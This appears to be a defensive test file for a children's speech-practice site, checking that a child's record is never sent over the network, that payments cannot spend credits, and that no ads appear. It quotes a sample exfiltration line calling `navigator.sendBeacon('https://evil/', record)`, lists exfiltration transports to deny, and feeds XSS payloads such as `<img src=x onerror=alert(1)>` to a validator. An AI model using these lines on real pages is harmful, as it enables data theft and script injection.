// The money, and the promises it must not break.
//
// 574 assertions covered the engine, the scene, the statistics, the journal,
// the voice and the acquisition surface. None of them covered the first line of
// code on this domain that takes a payment, and a payment surface is exactly
// where this product's defining promise gets broken by accident: someone
// "helpfully" attaches the practice record to a checkout call so the receipt
// can say which child it was for, and nothing visibly changes.
//
// TWO EARLIER VERSIONS OF THIS FILE WERE GREEN AND WORTHLESS. Both were found
// by attacking it rather than by reading it, and the shape of both mistakes is
// worth keeping in mind before adding anything here:
//
//   1. It matched request bodies on `fetch(`. The page dispatches through a
//      one-line api() wrapper, so the only literal fetch() is `fetch(path,
//      options)` and every body was invisible. A deliberate leak of
//      `record.targets` passed 15/15.
//   2. It enumerated what was allowed inside the two request shapes it knew
//      about. A reviewer added `navigator.sendBeacon('https://evil/', record)`
//      and the suite stayed 16/16 green, because a beacon is not a shape it
//      knew about.
//
// The lesson is that an allow-list over recognised call shapes tests the shapes,
// not the boundary. What follows now does both: it denies every transport it
// does not expect to exist at all, and asserts it can still see the calls it
// claims to police.

import { readFileSync, existsSync, readdirSync } from 'node:fs';
import assert from 'node:assert';

let pass = 0, fail = 0;
const t = (name, fn) => {
  try { fn(); console.log(`  ok   ${name}`); pass++; }
  catch (e) { console.log(`  FAIL ${name}\n       ${e.message}`); fail++; }
};
// A skip is not a pass. The cross-repo check below can legitimately not run,
// and counting that as green is how a suite quietly stops testing anything.
let skipped = 0;
const skip = (name, why) => { console.log(`  SKIP ${name}\n       ${why}`); skipped++; };

const { buildRecord } = await import('./public/engine/clinical.js');

const worker = readFileSync('src/worker/index.ts', 'utf8');
const page = readFileSync('public/clinician/index.html', 'utf8');
const wrangler = JSON.parse(readFileSync('wrangler.json', 'utf8'));

/* Assertions about *code* run against a comment-stripped copy; assertions about
 * the comments themselves run against the raw file. The distinction matters:
 * the worker names riskfreetrial.org in prose precisely to warn the next person
 * off calling it, and a naive search would read that warning as the violation
 * it exists to prevent. It also stops a comment from satisfying a code check. */
const stripComments = (s) => s
  .replace(/\/\*[\s\S]*?\*\//g, '')
  .replace(/(^|[^:])\/\/.*$/gm, '$1');
const workerCode = stripComments(worker);

const scriptBlocks = [...page.matchAll(/<script\b[^>]*>([\s\S]*?)<\/script>/g)].map((m) => m[1]);
const pageScript = scriptBlocks.join('\n');
const pageCode = stripComments(pageScript);

const requestBodies = [...pageCode.matchAll(/body:\s*JSON\.stringify\(([\s\S]*?)\)\s*,?\s*\n/g)].map((m) => m[1]);
const requestUrls = [...pageCode.matchAll(/api\(\s*[`'"]([^`'"]*)[`'"]/g)].map((m) => m[1]);
const wireText = [...requestBodies, ...requestUrls].join('\n');

console.log('\nthe child\'s record never reaches the network');

t('there is no transport here other than the one api() helper', () => {
  // The denial half, and the one that would have caught the sendBeacon leak.
  // Anything on this list can move bytes off the device without going through
  // api(), so its absence is the precondition for every assertion below being
  // worth anything. Adding a legitimate use means adding it to the checks that
  // follow, on purpose, in a diff somebody reads.
  const TRANSPORTS = [
    ['sendBeacon', /sendBeacon/],
    ['WebSocket', /new\s+WebSocket|WebSocket\s*\(/],
    ['EventSource', /new\s+EventSource/],
    ['XMLHttpRequest', /XMLHttpRequest/],
    ['Image() pixel', /new\s+Image\s*\(/],
    ['dynamic import', /\bimport\s*\(/],
    ['form submission', /\.submit\s*\(|<form/],
    ['navigator.share', /navigator\.share/],
  ];
  // Deliberately NOT on that list: navigator.clipboard.writeText, which backs
  // the "Copy underlying data" button. That hands the record to the clinician
  // who asked for it, on their own machine. It is not a transport.
  for (const [name, re] of TRANSPORTS) {
    assert(!re.test(pageCode), `${name} appeared on the clinician page — it can exfiltrate outside api()`);
  }
  // location assignment is used (Stripe redirect) but only to a hub-issued URL.
  const locations = [...pageCode.matchAll(/location\.href\s*=\s*([^;\n]+)/g)].map((m) => m[1].trim());
  for (const l of locations) {
    assert(l === 'out.url', `location.href assigned from something other than the hub checkout url: ${l}`);
  }
});

t('every fetch on the page goes through the single api() helper', () => {
  const fetches = [...pageCode.matchAll(/fetch\(([^)]*)/g)].map((m) => m[1].trim());
  assert.equal(fetches.length, 1, `expected exactly one fetch() (inside api()), found ${fetches.length}`);
  assert(/^path,\s*options/.test(fetches[0]), `the lone fetch() is no longer api()'s: fetch(${fetches[0]})`);
});

t('the page has exactly one script block, so nothing is hiding in a second', () => {
  // The extractor above joins them all, but a stray inline <script> is worth
  // failing on in its own right: this page is a document, not an app.
  assert.equal(scriptBlocks.length, 1, `expected 1 script block, found ${scriptBlocks.length}`);
  assert(!/<script[^>]*\ssrc=/i.test(page), 'the clinician page loads an external script');
});

t('the suite can actually see the requests it claims to police', () => {
  assert(requestBodies.length >= 1, `expected to find the checkout body, found ${requestBodies.length}`);
  assert(requestUrls.some((u) => u.includes('licence')), 'the licence request is no longer visible to this suite');
  assert(requestUrls.some((u) => u.includes('checkout')), 'the checkout request is no longer visible to this suite');
});

t('nothing derived from the record is sent to any endpoint', () => {
  const ALLOWED = ['email', 'offeringId', 'fullName'];
  const FORBIDDEN = /\b(record|targets|phoneme|adherence|log|attempts|verdict|journal|childName|firstName|dob|audio|pcm|waveform|embedding|voiceprint|fingerprint)\b/;
  assert(!FORBIDDEN.test(wireText),
    `something derived from the record is on the wire: ${wireText.replace(/\s+/g, ' ').slice(0, 160)}`);
  for (const body of requestBodies) {
    for (const key of body.matchAll(/([A-Za-z_$][\w$]*)\s*[:,}]/g)) {
      assert(ALLOWED.includes(key[1]), `unreviewed field "${key[1]}" is being sent to the server`);
    }
  }
});

t('the worker never reads a record field out of a request', () => {
  const forbidden = /body\.(record|log|targets|attempts|adherence|phoneme|childName|firstName|dob)/;
  assert(!forbidden.test(workerCode), 'the Worker is reading practice data out of a request body');
});

t('the checkout return URL cannot carry the record', () => {
  // successUrl is handed to the hub and to Stripe. ?data= is the child's
  // record; putting it here to "keep the report open after payment" is the
  // single most tempting way to break the promise, and it would look like a
  // usability fix in review.
  const urls = [...workerCode.matchAll(/(successUrl|cancelUrl):\s*`([^`]*)`/g)].map((m) => m[2]);
  assert(urls.length >= 2, 'the checkout return URLs are no longer visible to this suite');
  for (const u of urls) {
    assert(!/\bdata=/.test(u), `a checkout return URL carries the record: ${u}`);
  }
});

console.log('\nnothing here can spend anybody\'s money');

t('the worker has no credit-consuming call at all', () => {
  // Portfolio credits are ONE fungible balance per person (riskfreetrial's
  // fetchLedgerBalance keys on global_user_id; `domain` is recorded on the
  // ledger row but never scopes the debit). kide.us has no accounts by design,
  // so any spend call here is authorised by nothing but an emailed-in string --
  // a remote unauthenticated drain of credits bought on OTHER domains. The
  // licence model exists so this file can assert the capability is absent
  // rather than assert it is guarded.
  for (const m of ['consumeCredits', 'grantCredits', 'consumeAutomationCredits']) {
    assert(!new RegExp(`\\b${m}\\b`).test(workerCode),
      `${m}() is back in the Worker — kide has no session with which to authorise a spend`);
  }
});

t('the only hub calls are the two read/checkout ones', () => {
  const calls = [...new Set([...workerCode.matchAll(/billing\??\.([A-Za-z]+)\(/g)].map((m) => m[1]))];
  assert.deepEqual(calls.sort(), ['createCheckout', 'getCredits'],
    `unexpected hub calls: ${calls.join(', ')}`);
});

t('an unknown offering is refused, not silently swapped for a cheaper one', () => {
  // Substituting a differently-priced product on a payment path because an id
  // did not match is not a graceful fallback, it is a mispricing.
  assert(/unknown_offering/.test(workerCode), 'an unrecognised offeringId no longer returns an error');
  assert(!/OFFERINGS\.has\(requested\)\s*\?\s*requested\s*:/.test(workerCode),
    'the worker is silently falling back to the default offering for unknown ids');
});

t('a hub that does not answer is never reported as "you have not paid"', () => {
  // Telling somebody who already paid that they have not is how you take their
  // money twice. `ok` must be checked, not just the payload shape.
  const licence = (workerCode.match(/if \(route === "licence"\)[\s\S]*?\n  \}/) || [''])[0];
  assert(licence, 'the licence route has gone');
  assert(/!out\?\.ok/.test(licence), 'the licence route no longer distinguishes an unreachable hub from a real "no"');
  assert(/503/.test(licence), 'an unreachable hub no longer returns 503 from the licence route');
});

console.log('\nthe hub is reached the one way that works');

t('no code path HTTP-POSTs the billing hub', () => {
  // riskfreetrial.org sits behind bot-fight mode: a Worker-to-Worker HTTP POST
  // at the public hub URL comes back as Cloudflare error 1010, and it comes
  // back that way only in production. The service binding never touches it.
  assert(!/riskfreetrial\.(org|com)/.test(workerCode),
    'the Worker references the hub by URL instead of the service binding');
  // Two fetch tokens here are not outbound calls: `env.ASSETS.fetch()`, which
  // serves static files over a binding, and `async fetch(request…)`, which is
  // the Worker's own entrypoint. Anything else is real outbound HTTP and has no
  // business in this file.
  const fetches = [...workerCode.matchAll(/(\w[\w.]*\.)?\bfetch\(([^)]*)/g)]
    .filter((m) => m[1] !== 'env.ASSETS.' && !/^request:\s*Request/.test(m[2]))
    .map((m) => `${m[1] || ''}fetch(`);
  assert.equal(fetches.length, 0,
    `the Worker makes an outbound call (${fetches.join(', ')}) — billing must use the RPC binding`);
});

t('the bindings the worker uses are the bindings wrangler declares', () => {
  const declared = new Map((wrangler.services || []).map((s) => [s.binding, s]));
  for (const binding of ['PORTFOLIO_AI_SERVICE', 'PORTFOLIO_BILLING_SERVICE', 'PORTFOLIO_GROWTH_SERVICE']) {
    assert(declared.has(binding), `wrangler.json no longer declares ${binding}`);
    assert.equal(declared.get(binding).remote, true, `${binding} must be remote: true`);
    assert(declared.get(binding).entrypoint, `${binding} has no entrypoint`);
  }
  assert.equal(declared.get('PORTFOLIO_BILLING_SERVICE').service, 'riskfreetrial');
  assert.equal(declared.get('PORTFOLIO_AI_SERVICE').service, 'riskfreetrial');
  assert.equal(declared.get('PORTFOLIO_GROWTH_SERVICE').service, 'newgrowthbusiness');
});

console.log('\nthe two repos still agree, about ids AND about field names');

/** riskfreetrial checkouts sitting next to this one. */
const hubCandidates = ['../riskfreetrial/src/billing.ts',
  ...(existsSync('../.worktrees')
    ? readdirSync('../.worktrees').map((d) => `../.worktrees/${d}/src/billing.ts`)
    : [])].filter((p) => existsSync(p));
const hubSource = hubCandidates
  .map((p) => readFileSync(p, 'utf8'))
  .find((s) => /"kide\.us":/.test(s));

if (!hubSource) {
  skip('every offering the worker can request exists in riskfreetrial\'s catalog', [
    'no riskfreetrial checkout here has a DOMAIN_CATALOG_OVERRIDES entry for kide.us.',
    '       If the hub genuinely lacks it, kide checkout 503s and no clinician can pay.',
    '       If it is merged and this checkout is stale: git -C ../riskfreetrial pull --ff-only',
    `       looked in: ${hubCandidates.join(', ') || '(nothing found)'}`,
  ].join('\n'));
  skip('the worker sends field names the hub actually reads', 'same reason');
} else {
  t('every offering the worker can request exists in riskfreetrial\'s catalog', () => {
    // The failure this prevents: someone renames an offering in the hub, every
    // test in both repos stays green, and the next clinician to press Buy gets
    // a 502.
    const block = (hubSource.match(/"kide\.us":\s*\{[\s\S]*?\n  \},/) || [''])[0];
    assert(block, 'the kide.us catalog block could not be parsed out of billing.ts');
    const ours = [...(worker.match(/const OFFERINGS = new Set\(\[([^\]]*)\]/) || [, ''])[1]
      .matchAll(/"([^"]+)"/g)].map((m) => m[1]);
    assert(ours.length, 'the worker no longer declares an OFFERINGS set');
    for (const id of ours) {
      assert(block.includes(`"${id}"`), `offering "${id}" is not in riskfreetrial's kide.us catalog`);
    }
    const fallback = (worker.match(/const DEFAULT_OFFERING = "([^"]+)"/) || [])[1];
    assert(ours.includes(fallback), `DEFAULT_OFFERING "${fallback}" is not in OFFERINGS`);
  });

  t('the worker sends field names the hub actually reads', () => {
    // The bug that motivated this: the first version passed `idempotencyKey` to
    // consumeCredits. billing.ts reads `referenceId` and has never contained the
    // string "idempotencyKey" -- so the de-duplication the code claimed, the
    // commit message claimed and the UI relied on simply did not happen, and
    // every retry charged again. Matching ids across repos was not enough;
    // the RPC *input contract* needs checking too.
    const sent = new Set();
    for (const call of workerCode.matchAll(/billing\??\.createCheckout\(\{([\s\S]*?)\n\s*\}\)/g)) {
      for (const k of call[1].matchAll(/^\s*([A-Za-z_$][\w$]*)\s*:/gm)) sent.add(k[1]);
    }
    assert(sent.size, 'no createCheckout call found to check');
    // Searched across the whole hub file rather than inside one function: the
    // checkout inputs are consumed in two places (createBillingCheckoutRpc and
    // createCheckoutSession) and pinning the boundaries by regex was brittle
    // enough to produce a false failure on `domain`. Slightly looser -- a field
    // read only by an unrelated RPC would pass -- but it still catches the case
    // that motivated it: `idempotencyKey` appears nowhere in billing.ts at all.
    for (const field of sent) {
      assert(new RegExp(`input\\.${field}\\b`).test(hubSource),
        `the Worker sends "${field}" to createCheckout, but the hub never reads input.${field} anywhere`);
    }
  });
}

console.log('\nnothing a parent or child touches is behind the paywall');

t('the licence toggles only documentation scaffolding, never a measurement', () => {
  // domain-monetize's rule, and the honest one: the free analysis must be
  // genuinely useful. A clinician handed a link must be able to read every
  // number in it. Asserted against what applyPro() actually touches, rather
  // than against a list this file also owns -- the previous version compared
  // two hardcoded arrays and could not fail.
  const applyPro = (pageCode.match(/function applyPro[\s\S]*?\n\}/) || [''])[0];
  assert(applyPro, 'applyPro() has gone');
  const toggled = [...applyPro.matchAll(/\$\('([^']+)'\)\.classList\.toggle\('hidden'/g)].map((m) => m[1]);
  assert(toggled.length, 'applyPro() no longer toggles anything');
  const MEASUREMENTS = ['narrative', 'adherence', 'targets', 'method', 'meta'];
  for (const id of toggled) {
    assert(!MEASUREMENTS.includes(id), `applyPro() is gating the measurement section #${id} behind the paywall`);
  }
  for (const id of MEASUREMENTS) {
    assert(page.includes(`id="${id}"`), `the free report lost its #${id} section`);
  }
});

t('the free report is what renders when no licence is held', () => {
  // The measurement sections must not start hidden either -- gating by initial
  // markup would pass the applyPro check above and still paywall the numbers.
  for (const id of ['narrative', 'adherence', 'targets', 'method']) {
    const tag = (page.match(new RegExp(`<[^>]*id="${id}"[^>]*>`)) || [''])[0];
    assert(tag, `#${id} is gone`);
    assert(!/\bhidden\b/.test(tag), `#${id} starts hidden — the free report is paywalled by markup`);
  }
});

t('the paid path degrades to a readable message, never a broken page', () => {
  const handler = (workerCode.match(/async function handleClinicianApi[\s\S]*?\n\}/) || [''])[0];
  assert(handler, 'handleClinicianApi has gone');
  assert(/Billing is not configured for this deploy/.test(handler),
    'a deploy without the billing binding no longer fails honestly');
  assert(/405/.test(handler) && /Allow/.test(handler), 'a wrong method no longer returns 405 with Allow');
  assert(/not_found/.test(handler), 'an unknown clinician route no longer 404s');
});

t('the child is never identified in the professional document', () => {
  assert(/not a full name/i.test(page), 'the chart-reference field lost its warning');
  assert(!/id="fDob"|date of birth[^.]*<input/i.test(page),
    'the professional header is asking for a date of birth');
});

t('clinician identity is written to the DOM as text, never as markup', () => {
  // These fields are persisted locally and reflected into the document. If any
  // of them reaches innerHTML, the clinician's own stored details become a
  // self-XSS sink on a page that also renders an attacker-supplied ?data=.
  const applyPro = (pageCode.match(/function applyPro[\s\S]*?\n\}/) || [''])[0];
  for (const el of ['hdrClinician', 'hdrClinic', 'hdrChild', 'hdrPeriod', 'sigName', 'sigLicence']) {
    const uses = [...applyPro.matchAll(new RegExp(`\\$\\('${el}'\\)\\.(\\w+)`, 'g'))].map((m) => m[1]);
    assert(uses.length, `${el} is no longer populated`);
    for (const u of uses) assert(u === 'textContent', `${el} is written with .${u} instead of .textContent`);
  }
});

console.log('\na shared record link cannot attack the clinician who opens it');

t('a malicious ?data= payload cannot reach the report', () => {
  // buildRecord's output is rendered with innerHTML, and ?data= is a base64
  // blob in a URL a parent forwards and a clinician clicks. An unvalidated
  // target was a script injection deliverable by shared link -- against an
  // origin that now stores a clinician's name, credentials, licence number and
  // a child's chart reference.
  //
  // Executed, not grepped. The first version of this checked that the source
  // still mentioned VALID_TARGET, which stayed green when the constant was
  // deleted, because the name survived at its usage site.
  const ev = (target) => ({ target, tier: 'gop-webgpu', forced: false, verdict: 'clear', at: 1, word: 'w', level: 2 });
  const PAYLOADS = [
    'r_<img src=x onerror=alert(1)>',
    '<script>alert(1)</script>_initial',
    'r_initial"><script>alert(1)</script>',
    'r_javascript:alert(1)',
  ];
  for (const p of PAYLOADS) {
    const rec = buildRecord([ev(p), ev(p), ev(p)]);
    const rendered = JSON.stringify(rec);
    assert(!/[<>]/.test(rendered), `a payload survived into the record: ${p}`);
    assert.equal(rec.targets.length, 0, `a malformed target was kept: ${p}`);
  }
  // ...and a legitimate target still works, so the guard is not just "reject
  // everything", which would pass the assertions above and break the product.
  const good = buildRecord(Array.from({ length: 10 }, () => ev('r_initial')));
  assert.equal(good.targets.length, 1, 'the validator now rejects legitimate targets too');
  assert.equal(good.targets[0].phoneme, 'r');
  assert.equal(good.targets[0].position, 'initial');
});

console.log('\nthe paid surface obeys the same child-safety rules as the rest');

t('no ad or analytics tag rode in with the billing code', () => {
  assert(!/adsbygoogle|pagead2\.googlesyndication|ca-pub-|googletagmanager|google-analytics|gtag\(/i.test(page),
    'an ad or analytics tag has appeared on the clinician page');
  assert(!existsSync('public/ads.txt'), 'public/ads.txt is back');
});

t('the ads.txt rationale is still in the worker', () => {
  // It is a comment, so nothing breaks if it is deleted -- which is exactly why
  // it is asserted. It is the only written record of why this domain has no ad
  // inventory, and the next person to tidy up the worker will meet it.
  assert(/ads\.txt is deliberately ABSENT/.test(worker),
    'the ads.txt rationale has been removed from src/worker/index.ts');
  assert(/COPPA/.test(worker), 'the COPPA reasoning has been removed from src/worker/index.ts');
});

t('the clinician page is still excluded from search', () => {
  assert(/<meta name="robots" content="noindex,nofollow">/.test(page),
    'the clinician page — which renders a child\'s record — became indexable');
});

console.log(`\n${pass} passed, ${fail} failed${skipped ? `, ${skipped} skipped` : ''}\n`);
process.exit(fail ? 1 : 0);
